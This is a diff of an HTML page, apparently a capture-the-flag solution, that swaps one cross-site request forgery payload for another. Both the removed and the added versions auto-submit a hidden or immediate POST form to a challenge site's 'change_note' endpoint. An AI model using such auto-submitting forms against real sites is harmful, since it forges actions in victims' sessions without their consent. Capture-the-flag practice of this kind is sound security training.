@@ -1,19 +1,18 @@
-<script>
-    window.onload = function () {
-        let myBtn = document.getElementById('plsClickme');
-        myBtn.click()
-    };
+<!DOCTYPE html>
+<html>
 
-    function go() {
-        let w = window.open("https://tbdxss.chal.perfect.blue/");
-        setTimeout(function () { w.close(); csrf.submit() }, 1000)
-    }
-</script>
+<head>
+    <meta charset='utf-8'>
+</head>
 
-<h1 onclick=go() id="plsClickme">Click me</h1>
+<body>
+    <form method="POST" id="myform" name="myform" action="https://tbdxss.chal.perfect.blue/change_note">
+        <input type="text" name="data" value="test"></input>
+        <input type="submit"></submit>
+    </form>
+    <script>
+        document.myform.submit();
+    </script>
+</body>
 
-
-<form style="display:none" name=csrf method=post id="noteform" action="https://tbdxss.chal.perfect.blue/change_note">
-    <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content" value="test"></textarea>
-    <input type="submit" value="submit">
-</form>
+</html>
